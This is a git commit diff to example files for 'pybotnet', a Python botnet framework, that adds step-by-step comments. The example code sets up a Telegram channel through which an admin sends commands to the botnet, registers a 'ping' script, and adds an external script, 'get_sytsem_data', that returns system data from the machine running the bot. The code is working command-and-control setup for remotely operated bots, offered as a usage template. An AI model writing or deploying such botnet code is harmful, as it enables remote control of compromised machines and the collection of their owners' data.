f45e9d0f2555ef38aff4909e6c2cbb25cb841588
onionj <onionj98@gmail.com>
2022-05-27 23:07:34 +0430

    add comment

--- simple.py
+++ simple.py
@@ -1,31 +1,35 @@
 import logging
 
-from pybotnet import BotNet, Request, UserException, TelegramEngine
+from pybotnet import BotNet, Request, TelegramEngine
 from simple_external import external_botnet
 
 from configs import ADMIN_CHAT_ID, TELEGRAM_TOKEN
 
 _logger = logging.getLogger(f"__{__name__}   ")
 
+#step (1)
 # create engine: Engines transfer messages between admin and botnet
 telegram_engine = TelegramEngine(
     token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID, use_proxy=True
 )
 
-
+#step (2)
+# create BotNet instance
 botnet = BotNet(telegram_engine, debug=False)
 
-# create new script
+
+# create new custom script (Optional)
 @botnet.add_script(script_version="0.1.0")
 def ping(request: Request, *args):
     """`ping`"""
     return f"pong {' '.join(args)}"
 
 
-# add external scripts
+# add example external scripts (Optional)
 botnet.import_scripts(external_botnet)
 
-
+#step (3)
+# run botnet instance
 if __name__ == "__main__":
     _logger.debug(botnet)
     botnet.run()
--- simple_external.py
+++ simple_external.py
@@ -1,11 +1,27 @@
 from pybotnet import ExternalScripts
 from pybotnet.request import Request
 
+# example external scripts
 
+# step (1)
+# create ExternalScripts instance
 external_botnet = ExternalScripts()
 
+# step (2)
+# add some script:
 
-@external_botnet.add_script(script_name='echo_meta_data', script_version="0.1.0")
-def echo_meta_data(request: Request, *args):
+@external_botnet.add_script(script_name='get_meta_data', script_version="0.1.0")
+def get_meta_data(request: Request, *args):
     """return meta_data"""
     return request.meta_data
+
+
+@external_botnet.add_script(script_name='get_sytsem_data', script_version="0.1.0")
+def get_sytsem_data(request: Request, *args):
+    """return sytsem_data"""
+    return request.sytsem_data
+
+
+# step (3)
+# example: whe import `external_botnet` in `simple.py` file and
+#  run `botnet.import_scripts(external_botnet)`
